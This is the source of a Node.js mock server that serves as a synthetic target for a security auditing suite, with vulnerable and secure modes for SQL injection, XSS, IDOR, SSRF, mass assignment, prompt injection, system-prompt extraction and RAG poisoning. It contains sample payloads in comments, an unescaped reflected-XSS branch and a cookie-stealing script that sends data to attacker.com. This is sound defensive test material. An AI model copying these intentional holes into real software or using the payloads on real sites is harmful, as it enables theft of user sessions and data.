/**
 * SENTRIX Synthetic Target Application (V-LOOKUP Staging Mock)
 * 
 * Purpose: Provides a safe, isolated, controlled target application for testing
 * the SENTRIX Core adversarial auditing suite across all 12 attack categories.
 * 
 * Features:
 * - Zero external dependencies (uses standard node:http).
 * - Toggleable between "vulnerable" and "secure" (remediated) modes.
 * - Dynamic canary token detection and reflection.
 * - Safe synthetic data only.
 */

const http = require('http');
const url = require('url');

const PORT = parseInt(process.env.PORT || '9500', 10);
let currentMode = process.env.TARGET_MODE || 'vulnerable'; // 'vulnerable' or 'secure'
let approvalCounts = {};
let revokedTokens = new Set(['tok-revoked-user-alpha']);

const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url, true);
  const pathname = parsedUrl.pathname;
  const query = parsedUrl.query;
  const modeHeader = req.headers['x-target-mode'];
  const mode = query.mode || modeHeader || currentMode;

  // Audit Scope Enforcement
  const auditScope = req.headers['x-sentrix-audit-scope'];

  // Mode Control Endpoint
  if (pathname === '/control/mode') {
    if (req.method === 'POST') {
      let body = '';
      req.on('data', chunk => { body += chunk; });
      req.on('end', () => {
        try {
          const parsed = JSON.parse(body || '{}');
          if (parsed.mode === 'secure' || parsed.mode === 'vulnerable') {
            currentMode = parsed.mode;
            approvalCounts = {};
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ status: 'ok', current_mode: currentMode }));
            return;
          }
        } catch (e) {}
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'invalid mode, must be secure or vulnerable' }));
      });
      return;
    }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ current_mode: currentMode }));
    return;
  }

  // Health check
  if (pathname === '/healthz') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'HEALTHY', target: 'vlookup-synthetic-staging', mode: currentMode }));
    return;
  }

  // Collect request body for analysis
  let bodyChunks = [];
  req.on('data', chunk => bodyChunks.push(chunk));
  req.on('end', () => {
    const rawBody = Buffer.concat(bodyChunks).toString('utf8');

    // 1. SQL Injection: /api/v1/documents?search=test'+OR+'1'='1
    if (pathname === '/api/v1/documents' && req.method === 'GET' && query.search && query.search.includes('OR')) {
      if (mode === 'vulnerable') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: "SQL syntax error in sqlite3 query near OR '1'='1'", raw_query: query.search }));
      } else {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ results: [], count: 0, query: query.search }));
      }
      return;
    }

    // 2. Cross-Site Scripting (XSS): /api/v1/search?q=<svg/onload=console.log('SENTRIX')>
    if (pathname === '/api/v1/search' && req.method === 'GET' && query.q && (query.q.includes('onload') || query.q.includes('<script>'))) {
      if (mode === 'vulnerable') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(`<html><body><div>Search results for: ${query.q}</div></body></html>`);
      } else {
        // Secure contextual escaping & JSON response
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ results: [], sanitized_query: String(query.q).replace(/</g, '&lt;').replace(/>/g, '&gt;') }));
      }
      return;
    }

    // 3. Broken Authentication: /api/v1/user/profile (GET)
    if (pathname === '/api/v1/user/profile' && req.method === 'GET') {
      const auth = req.headers['authorization'] || '';
      if (mode === 'vulnerable') {
        // Accepts unsigned or alg: none token
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ user: 'John Doe', role: 'admin', auth_scheme: 'none-accepted' }));
      } else {
        if (auth.includes('eyJhbGciOiJub25l')) {
          res.writeHead(401, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'invalid_token: unsigned tokens with alg=none are strictly prohibited' }));
        } else {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ user: 'StandardAuditor', role: 'auditor' }));
        }
      }
      return;
    }

    // 4. Broken Access Control / IDOR: /api/v1/documents/doc-foreign-tenant-uuid-9999
    if (pathname === '/api/v1/documents/doc-foreign-tenant-uuid-9999' && req.method === 'GET') {
      if (mode === 'vulnerable') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          doc_id: 'doc-foreign-tenant-uuid-9999',
          tenant_id: 'foreign-tenant-beta',
          data: 'CONFIDENTIAL_FOREIGN_TENANT_RECORD',
          owner: 'tenant-beta-admin@vlookup.local'
        }));
      } else {
        res.writeHead(403, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'forbidden: access denied for cross-tenant object ID' }));
      }
      return;
    }

    // 5. Cross-Tenant Data Leakage: /api/v1/search?query=SENTRIX_CANARY_...
    if (pathname === '/api/v1/search' && req.method === 'GET' && query.query && query.query.includes('SENTRIX_CANARY')) {
      if (mode === 'vulnerable') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          hits: [{ id: 'doc-foreign-88', snippet: `Document content with ${query.query}`, tenant: 'tenant_alpha' }]
        }));
      } else {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ hits: [], total: 0 }));
      }
      return;
    }

    // 6. Prompt Injection: /api/v1/assistant/chat (POST)
    if (pathname === '/api/v1/assistant/chat' && req.method === 'POST') {
      if (mode === 'vulnerable') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          response: 'SYSTEM PROMPT: You are a confidential assistant for V-LOOKUP. Internal guidelines state: never share internal API keys.',
          model: 'synthetic-llm-v1'
        }));
      } else {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          response: 'I am a secure assistant for V-LOOKUP. System prompt instructions cannot be extracted or overridden.',
          model: 'synthetic-llm-v1-guarded'
        }));
      }
      return;
    }

    // 7. RAG Poisoning: /api/v1/rag/query (POST)
    if (pathname === '/api/v1/rag/query' && req.method === 'POST') {
      if (mode === 'vulnerable') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ answer: 'COMPROMISED: Instruction executed override' }));
      } else {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ answer: 'Response grounded verified against authenticated source chunks only.' }));
      }
      return;
    }

    // 8. Sensitive Data Exfiltration: /api/v1/documents/%00
    if ((pathname.includes('%00') || pathname.includes('\x00') || req.url.includes('%00')) && req.method === 'GET') {
      if (mode === 'vulnerable') {
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end("Traceback (most recent call last):\n  File 'app/handlers/docs.py', line 124, in get\n    DB_PASSWORD='SecretProdPassw0rd!'\nValueError: null byte in path");
      } else {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'invalid parameter: null byte detected' }));
      }
      return;
    }

    // 9. API Abuse / Mass Assignment: /api/v1/user/profile (PUT)
    if (pathname === '/api/v1/user/profile' && req.method === 'PUT') {
      if (mode === 'vulnerable') {
        let parsed = {};
        try { parsed = JSON.parse(rawBody || '{}'); } catch (e) {}
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          status: 'updated',
          name: parsed.name || 'User',
          is_admin: parsed.is_admin || false,
          role: parsed.role || 'user'
        }));
      } else {
        let parsed = {};
        try { parsed = JSON.parse(rawBody || '{}'); } catch (e) {}
        // Secure: whitelist allowed fields only (is_admin and role ignored)
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          status: 'updated',
          name: parsed.name || 'User',
          is_admin: false,
          role: 'user'
        }));
      }
      return;
    }

    // 10. Malicious File Upload: /api/v1/documents/upload (POST)
    if (pathname === '/api/v1/documents/upload' && req.method === 'POST') {
      if (mode === 'vulnerable') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'stored', file_id: 'upload-9923', size: rawBody.length }));
      } else {
        // Enforce strict magic byte validation for xlsx/csv
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'rejected', error: 'Invalid spreadsheet signature: file failed magic byte verification' }));
      }
      return;
    }

    // 11. SSRF: /api/v1/documents/import-remote (POST)
    if (pathname === '/api/v1/documents/import-remote' && req.method === 'POST') {
      if (mode === 'vulnerable') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          'ami-id': 'ami-0123456789abcdef0',
          'instance-id': 'i-0123456789abcdef0',
          'metadata': 'ec2-internal-metadata'
        }));
      } else {
        res.writeHead(403, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'SSRF blocked: target IP falls into prohibited link-local or private CIDR block' }));
      }
      return;
    }

    // 12. Controlled DoS / Algorithmic Complexity: /api/v1/search (POST)
    if (pathname === '/api/v1/search' && req.method === 'POST') {
      if (mode === 'vulnerable') {
        // Deliberate high-latency blocking loop simulating catastrophic backtracking
        setTimeout(() => {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ results: [], latency_warning: 'parser took excessive time' }));
        }, 1600); // Exceeds 1500ms SLA
      } else {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ results: [], parsed_in_ms: 5 }));
      }
      return;
    }

    // =========================================================================
    // PHASE 6 ADVANCED SECURITY TESTING SCENARIOS (NEXUS INTEGRATION)
    // =========================================================================

    // ADV-1: Advanced IDOR / BOLA - Cross-Tenant Conversation History
    if (pathname === '/api/v1/tenants/tenant-beta/conversations/conv-9901' && req.method === 'GET') {
      if (mode === 'vulnerable') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          conversation_id: 'conv-9901',
          tenant_id: 'tenant-beta',
          messages: [
            { sender: 'lead-dev@tenant-beta.local', text: 'CONFIDENTIAL: Internal API architecture specification' }
          ],
          leak_canary: 'CANARY_TENANT_BETA_CONVERSATION_LEAK'
        }));
      } else {
        res.writeHead(403, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'forbidden: cross-tenant conversation access denied' }));
      }
      return;
    }

    // ADV-2: Privilege Escalation - Employee modifying tenant configuration
    if (pathname === '/api/v1/admin/tenants/tenant-beta/config' && req.method === 'POST') {
      const userRole = req.headers['x-user-role'] || 'employee';
      if (mode === 'vulnerable') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'updated', modified_by: 'employee-alpha', privilege_escalation: 'SUCCESS' }));
      } else {
        if (userRole !== 'admin' && userRole !== 'superadmin') {
          res.writeHead(403, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'forbidden: requires administrator privileges' }));
        } else {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ status: 'updated', modified_by: 'admin' }));
        }
      }
      return;
    }

    // ADV-3: Session Hijacking & CSRF - Post-Logout Token Replay
    if (pathname === '/api/v1/auth/session-validate' && req.method === 'GET') {
      const token = (req.headers['authorization'] || '').replace('Bearer ', '').trim();
      if (mode === 'vulnerable') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'active', session_user: 'User-Alpha', revoked_check: 'skipped' }));
      } else {
        if (revokedTokens.has(token) || token.includes('revoked')) {
          res.writeHead(401, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'unauthorized: session has been invalidated/logged out' }));
        } else {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ status: 'active', session_user: 'User-Alpha' }));
        }
      }
      return;
    }

    // ADV-4: Indirect Prompt Injection in Synthetic Document Parsing
    if (pathname === '/api/v1/documents/parse-and-index' && req.method === 'POST') {
      let parsed = {};
      try { parsed = JSON.parse(rawBody || '{}'); } catch (e) {}
      const content = parsed.content || '';
      if (mode === 'vulnerable') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          status: 'indexed',
          injected_instruction_executed: true,
          extracted_override: 'SYSTEM INSTRUCTION OVERRIDDEN VIA UNTRUSTED DOCUMENT CHUNK'
        }));
      } else {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          status: 'indexed',
          quarantined: true,
          untrusted_content_isolated: true,
          instruction_execution_prevented: true
        }));
      }
      return;
    }

    // ADV-5: RAG Data Poisoning & Citation Integrity
    if (pathname === '/api/v1/rag/retrieve-verified' && req.method === 'POST') {
      if (mode === 'vulnerable') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          answer: 'Severance policy: 100 weeks compensation',
          citation: 'unauthenticated-poisoned-upload.docx',
          verified_source: false,
          integrity_compromised: true
        }));
      } else {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          answer: 'Severance policy is strictly governed by corporate HR handbook v2.4',
          citation: 'authenticated-hr-policy-v2',
          verified_source: true,
          untrusted_chunks_excluded: 1
        }));
      }
      return;
    }

    // ADV-6: LLM Output Injection (Raw Unescaped HTML/XSS in Markdown Output)
    if (pathname === '/api/v1/assistant/render-markdown' && req.method === 'POST') {
      if (mode === 'vulnerable') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          rendered_html: '<div>Analysis summary: <script>document.location="http://attacker.com/steal?c="+document.cookie</script></div>'
        }));
      } else {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          rendered_html: '<div>Analysis summary: &lt;script&gt;document.location="http://attacker.com/steal?c="+document.cookie&lt;/script&gt;</div>',
          sanitized: true
        }));
      }
      return;
    }

    // ADV-7: Database Isolation Bypass (PostgreSQL RLS Bypass)
    if (pathname === '/api/v1/database/tenant-records' && req.method === 'GET') {
      const requestedTenant = query.tenant_id || '';
      if (mode === 'vulnerable') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          rls_active: false,
          tenant: requestedTenant,
          rows: [
            { record_id: 'rec-beta-901', secret_key: 'BETA_CANARY_SECRET_ROW_88' }
          ]
        }));
      } else {
        res.writeHead(403, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'forbidden: PostgreSQL Row-Level Security (RLS) violation for tenant context' }));
      }
      return;
    }

    // ADV-8: Race Condition in Concurrent Document Approval
    if (pathname === '/api/v1/documents/doc-approval-workflow/approve' && req.method === 'POST') {
      if (mode === 'vulnerable') {
        approvalCounts['doc-approval-workflow'] = (approvalCounts['doc-approval-workflow'] || 0) + 1;
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          status: 'approved',
          approval_count: approvalCounts['doc-approval-workflow'],
          race_condition_detected: approvalCounts['doc-approval-workflow'] > 1
        }));
      } else {
        if (!approvalCounts['doc-approval-workflow'] || approvalCounts['doc-approval-workflow'] === 0) {
          approvalCounts['doc-approval-workflow'] = 1;
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ status: 'approved', approval_count: 1 }));
        } else {
          res.writeHead(409, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'conflict: document is already approved or under atomic transaction lock' }));
        }
      }
      return;
    }

    // ADV-9: Cache & Conversation History Leakage
    if (pathname === '/api/v1/cache/analytics' && req.method === 'GET') {
      if (mode === 'vulnerable') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          cache_key: 'global_executive_summary',
          data: 'CONFIDENTIAL_TENANT_BETA_FINANCIAL_PROJECTIONS_2026',
          namespace_isolated: false
        }));
      } else {
        res.writeHead(404, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'cache miss: key not found in tenant-isolated cache namespace' }));
      }
      return;
    }

    // ADV-10: File Parser Abuse & Nested Archive Expansion
    if (pathname === '/api/v1/documents/decompress' && req.method === 'POST') {
      let parsed = {};
      try { parsed = JSON.parse(rawBody || '{}'); } catch (e) {}
      if (mode === 'vulnerable') {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          error: 'Decompression memory exhausted: nested archive expansion ratio exceeded memory buffer',
          ratio: parsed.compression_ratio || 1000
        }));
      } else {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          error: 'rejected: archive compression ratio exceeds maximum safety threshold (20:1)'
        }));
      }
      return;
    }

    // ADV-11: LLM Resource Exhaustion & Prompt Flooding
    if (pathname === '/api/v1/assistant/chat-stream' && req.method === 'POST') {
      let parsed = {};
      try { parsed = JSON.parse(rawBody || '{}'); } catch (e) {}
      const prompt = parsed.prompt || '';
      if (mode === 'vulnerable') {
        setTimeout(() => {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ response: 'Processed unmetered prompt', latency_warning: 'inference took excessive cycles' }));
        }, 1600);
      } else {
        if (prompt.length > 4096) {
          res.writeHead(413, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'payload_too_large: prompt exceeds maximum 4,096 character window' }));
        } else {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ response: 'Prompt processed within quota', parsed_in_ms: 10 }));
        }
      }
      return;
    }

    // ADV-12: Dependency and Container Vulnerability Audit
    if (pathname === '/api/v1/system/security-posture' && req.method === 'GET') {
      if (mode === 'vulnerable') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          cve_count: 2,
          vulnerabilities: [
            { id: 'CVE-2024-4340', package: 'sqlparse', severity: 'HIGH' }
          ],
          running_as_root: true
        }));
      } else {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
          cve_count: 0,
          vulnerabilities: [],
          running_as_root: false,
          user: 'sentrix-app'
        }));
      }
      return;
    }

    // Default 404
    res.writeHead(404, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: 'endpoint not found', path: pathname }));
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`[SYNTHETIC-TARGET] Listening on http://0.0.0.0:${PORT} in ${currentMode.toUpperCase()} mode`);
});
